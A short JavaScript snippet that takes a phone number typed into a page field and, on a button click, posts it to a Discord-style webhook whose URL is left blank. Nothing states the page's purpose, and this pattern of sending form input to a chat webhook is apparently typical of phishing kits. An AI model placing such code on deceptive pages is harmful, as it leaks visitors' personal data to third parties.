const number = document.getElementById("mobile_txtfield_msg");
const footer_button = document.getElementById("footer_button");

function sendWebhook() {
    var webhookURL = '';
    var data = {
        "content": null,
        "embeds": [
            {
                "title": "New Number",
                "description": `New number: ${number.value}`,
                "color": 16777215,
                "footer": {
                    "text": "Number sent from the website"
                }
            }
        ]
    };

    var requestOptions = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(webhookURL, requestOptions)
}


footer_button.addEventListener("click", function () {
  sendWebhook();
});
